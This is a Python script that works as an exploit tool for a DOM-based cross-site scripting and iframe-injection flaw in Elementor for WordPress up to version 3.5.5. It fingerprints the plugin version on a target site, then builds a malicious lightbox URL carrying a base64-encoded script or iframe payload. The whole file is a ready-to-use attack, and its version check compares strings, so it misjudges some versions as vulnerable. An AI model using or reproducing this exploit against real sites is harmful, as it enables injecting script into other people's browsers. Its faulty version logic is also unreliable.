import requests
import re
import base64

# Function to check Elementor version from plugin files
def get_elementor_version_from_file(target_url):
    possible_paths = [
        "/wp-content/plugins/elementor/assets/css/frontend.min.css",
        "/wp-content/plugins/elementor/assets/js/frontend.min.js"
    ]
    
    for path in possible_paths:
        try:
            response = requests.get(f"{target_url}{path}")
            response.raise_for_status()
            
            # Search for version number in the first line
            version_match = re.search(r'v(\d+\.\d+\.\d+)', response.text)
            if version_match:
                version = version_match.group(1)
                print(f"Elementor version found in {path}: {version}")
                return version
        except Exception as e:
            print(f"Error accessing {path}: {e}")
    
    print("Elementor version not found in specified files.")
    return None

# Function to encode payloads to base64
def encode_payload(payload):
    payload_bytes = payload.encode('utf-8')
    base64_bytes = base64.b64encode(payload_bytes)
    base64_payload = base64_bytes.decode('utf-8')
    return base64_payload

# Define the main function
def main():
    target_url = input("Enter the target URL (e.g., https://example.com): ")

    version = get_elementor_version_from_file(target_url)
    
    if version is None:
        return
    
    # Check if the version is less than or equal to 3.5.5
    if version <= "3.5.5":
        print("It's Vulnerable!")
        
        choice = input("Choose payload: (1) XSS or (2) iFrame Injection: ")
        
        if choice == "1":
            alert_message = input("Enter the XSS alert message (e.g., 'xss'): ")
            xss_payload = f'{{"type":"null","html":"<script>alert(\'{alert_message}\')</script>"}}'
            encoded_payload = encode_payload(xss_payload)
            exploit_url = f"{target_url}/#elementor-action:action=lightbox&settings={encoded_payload}"
            print(f"XSS Payload URL: {exploit_url}")
        
        elif choice == "2":
            iframe_url = input("Enter the iFrame URL (e.g., 'https://example.com'): ")
            iframe_payload = f'{{"type":"video","url":"{iframe_url}"}}'
            encoded_payload = encode_payload(iframe_payload)
            exploit_url = f"{target_url}/#elementor-action:action=lightbox&settings={encoded_payload}"
            print(f"iFrame Injection Payload URL: {exploit_url}")
        
        else:
            print("Invalid choice.")
    
    else:
        print("Site not Vulnerable.")

# Run the main function
if __name__ == "__main__":
    main()

